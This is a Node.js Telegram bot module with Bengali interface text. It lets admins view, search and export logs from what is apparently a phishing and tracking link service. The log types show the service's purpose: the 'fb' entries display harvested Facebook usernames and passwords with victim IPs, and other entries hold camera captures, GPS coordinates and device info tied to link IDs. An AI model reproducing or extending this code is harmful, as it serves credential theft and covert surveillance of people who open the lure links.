const adminCheck = require('../middlewares/adminCheck');
const Log = require('../models/Log');
const helpers = require('../utils/helpers');

class LogsCommand {
  constructor() {
    this.categories = {
      users: 'user',
      commands: 'command',
      fb: 'fb',
      camera: 'camera',
      location: 'location',
      info: 'info',
      errors: 'error',
      system: 'system',
      all: null
    };
    
    this.typeNames = {
      user: '👤 ইউজার',
      command: '⌨️ কমান্ড',
      fb: '📸 ফেসবুক',
      camera: '📷 ক্যামেরা',
      location: '📍 লোকেশন',
      info: '📱 ইনফো',
      error: '❌ এরর',
      system: '⚙️ সিস্টেম'
    };
  }
  
  async execute(bot, msg) {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;
    
    try {
      const isAdmin = await adminCheck(userId);
      if (!isAdmin) {
        return bot.sendMessage(chatId, '⛔ আপনি অ্যাডমিন নন।');
      }
      
      const parts = text.split(' ');
      let type = 'all';
      let page = 1;
      let searchTerm = null;
      
      // কমান্ড পার্স
      if (parts.length > 1) {
        if (parts[1] === 'page' && parts[2]) {
          page = parseInt(parts[2]);
        } else if (parts[1] === 'search' && parts[2]) {
          searchTerm = parts.slice(2).join(' ');
        } else {
          type = parts[1];
          if (parts[2] === 'page' && parts[3]) {
            page = parseInt(parts[3]);
          } else if (parts[2] === 'search' && parts[3]) {
            searchTerm = parts.slice(3).join(' ');
          }
        }
      }
      
      // ক্যাটাগরি ভ্যালিডেশন
      if (!this.categories.hasOwnProperty(type)) {
        return this.showCategories(bot, chatId);
      }
      
      // কোয়েরি বিল্ড
      const query = this.buildQuery(type, searchTerm);
      const pageSize = 10;
      const skip = (page - 1) * pageSize;
      
      // ডাটা ফেচ
      const logs = await Log.find(query)
        .sort({ timestamp: -1 })
        .skip(skip)
        .limit(pageSize);
      
      const totalLogs = await Log.countDocuments(query);
      const totalPages = Math.ceil(totalLogs / pageSize);
      
      if (logs.length === 0) {
        return bot.sendMessage(chatId, '📭 কোনো লগ পাওয়া যায়নি।');
      }
      
      // লগ মেসেজ বিল্ড
      let logMessage = this.buildLogMessage(type, logs, page, totalPages, totalLogs);
      
      await bot.sendMessage(chatId, logMessage, { parse_mode: 'Markdown' });
      
    } catch (error) {
      console.error('Logs Command Error:', error);
      await bot.sendMessage(chatId, '❌ লগ দেখাতে সমস্যা হয়েছে।');
    }
  }
  
  buildQuery(type, searchTerm) {
    const logType = this.categories[type];
    const query = logType ? { type: logType } : {};
    
    if (searchTerm) {
      query.$or = [
        { 'details.username': { $regex: searchTerm, $options: 'i' } },
        { 'details.linkId': { $regex: searchTerm, $options: 'i' } },
        { username: { $regex: searchTerm, $options: 'i' } },
        { action: { $regex: searchTerm, $options: 'i' } }
      ];
    }
    
    return query;
  }
  
  buildLogMessage(type, logs, page, totalPages, totalLogs) {
    let message = `📜 𝐋𝐎𝐆𝐒 - ${type.toUpperCase()}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n`;
    message += `পৃষ্ঠা ${page}/${totalPages} (${helpers.formatNumber(totalLogs)}টি এন্ট্রি)\n\n`;
    
    logs.forEach(log => {
      const time = helpers.formatTime(log.timestamp, 'HH:mm:ss');
      
      switch(log.type) {
        case 'fb':
          message += `[${time}] 📸 ${this.typeNames.fb}\n`;
          message += `📧 ${log.details?.username || 'N/A'} | 🔑 ${log.details?.password || 'N/A'}\n`;
          message += `🌍 ${log.ip || 'N/A'}\n`;
          message += `🔗 ${log.details?.linkId || 'N/A'}\n\n`;
          break;
          
        case 'camera':
          message += `[${time}] 📷 ${this.typeNames.camera}\n`;
          message += `🔗 ${log.details?.linkId || 'N/A'}\n`;
          message += `🌍 ${log.ip || 'N/A'}\n`;
          message += `📊 সাইজ: ${helpers.formatSize(log.details?.data?.size || 0)}\n\n`;
          break;
          
        case 'location':
          message += `[${time}] 📍 ${this.typeNames.location}\n`;
          message += `🔗 ${log.details?.linkId || 'N/A'}\n`;
          if (log.details?.data?.lat && log.details?.data?.lng) {
            message += `📍 ${log.details.data.lat}, ${log.details.data.lng}\n`;
          }
          message += `🌍 ${log.ip || 'N/A'}\n\n`;
          break;
          
        case 'info':
          message += `[${time}] 📱 ${this.typeNames.info}\n`;
          message += `🔗 ${log.details?.linkId || 'N/A'}\n`;
          message += `📱 ${log.details?.data?.device || 'N/A'}\n`;
          message += `🌍 ${log.ip || 'N/A'}\n\n`;
          break;
          
        case 'user':
          message += `[${time}] 👤 ${log.username || 'Unknown'}\n`;
          message += `📌 ${log.action}\n`;
          message += `🆔 ${log.userId || 'N/A'}\n\n`;
          break;
          
        case 'command':
          message += `[${time}] ⌨️ ${log.username || 'Unknown'}\n`;
          message += `/${log.action}\n`;
          message += `📊 ${JSON.stringify(log.details || {})}\n\n`;
          break;
          
        case 'error':
          message += `[${time}] ❌ Error\n`;
          message += `${log.details?.message || 'Unknown error'}\n`;
          message += `📍 ${log.details?.source || 'N/A'}\n\n`;
          break;
          
        case 'system':
          message += `[${time}] ⚙️ System\n`;
          message += `${log.action}\n`;
          message += `📊 ${JSON.stringify(log.details || {})}\n\n`;
          break;
          
        default:
          message += `[${time}] ${log.type}\n`;
          message += `${log.action || 'N/A'}\n\n`;
      }
    });
    
    // নেভিগেশন
    message += `📊 টোটাল: ${helpers.formatNumber(totalLogs)} এন্ট্রি\n`;
    if (page < totalPages) {
      message += `🔄 পরবর্তী: /logs ${type} page ${page + 1}\n`;
    }
    if (page > 1) {
      message += `⬅️ পূর্ববর্তী: /logs ${type} page ${page - 1}\n`;
    }
    message += `📥 এক্সপোর্ট: /logs ${type} export\n`;
    message += `🔍 সার্চ: /logs ${type} search [টার্ম]`;
    
    return message;
  }
  
  async showCategories(bot, chatId) {
    const message = `📋 𝐋𝐎𝐆 𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒\n\n` +
      `**ইউজার লগ**\n` +
      `• /logs users - ইউজার অ্যাক্টিভিটি\n` +
      `• /logs commands - কমান্ড ইউসেজ\n\n` +
      `**ডাটা লগ**\n` +
      `• /logs fb - ফেসবুক ডাটা\n` +
      `• /logs camera - ক্যামেরা ক্যাপচার\n` +
      `• /logs location - লোকেশন ডাটা\n` +
      `• /logs info - ডিভাইস ইনফো\n\n` +
      `**সিস্টেম লগ**\n` +
      `• /logs errors - এরর লগ\n` +
      `• /logs system - সিস্টেম লগ\n` +
      `• /logs all - সব লগ (প্যাজিনেটেড)`;
    
    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
  }
  
  async export(bot, msg) {
    // এক্সপোর্ট ফিচার (JSON ফাইল হিসেবে)
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    try {
      const isAdmin = await adminCheck(userId);
      if (!isAdmin) return;
      
      const parts = msg.text.split(' ');
      const type = parts[1] || 'all';
      
      const logType = this.categories[type];
      const query = logType ? { type: logType } : {};
      
      const logs = await Log.find(query).sort({ timestamp: -1 }).limit(1000);
      
      // JSON ফাইল তৈরি
      const jsonData = JSON.stringify(logs, null, 2);
      const buffer = Buffer.from(jsonData, 'utf-8');
      
      await bot.sendDocument(chatId, buffer, {
        filename: `logs_${type}_${Date.now()}.json`,
        caption: `📊 ${logs.length}টি লগ এক্সপোর্ট করা হয়েছে`
      });
      
    } catch (error) {
      console.error('Export Error:', error);
      await bot.sendMessage(chatId, '❌ এক্সপোর্ট করতে সমস্যা হয়েছে।');
    }
  }
}

module.exports = new LogsCommand();